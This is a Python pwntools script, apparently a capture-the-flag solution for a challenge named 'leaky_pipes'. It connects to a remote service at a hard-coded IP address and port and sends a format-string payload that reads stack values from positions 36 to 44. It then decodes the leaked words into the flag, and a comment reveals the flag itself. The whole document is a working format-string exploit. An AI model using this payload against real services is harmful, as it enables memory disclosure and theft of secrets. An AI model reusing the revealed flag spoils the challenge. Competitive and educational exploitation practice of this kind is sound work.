#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./leaky_pipes", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 1337)

p.readuntil(b">> ")

p.sendline(b"%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.")

p.readline()

dwords = p.readline().decode().split(".")[:-1]

flag = b""
for dword in dwords:
    flag += int(dword, 16).to_bytes(length=4, byteorder="little")

flag = flag[:flag.index(b"}")+1]

log.success(flag.decode()) # OSCTF{F0rm4t_5tr1ngs_l3ak4g3_l0l}
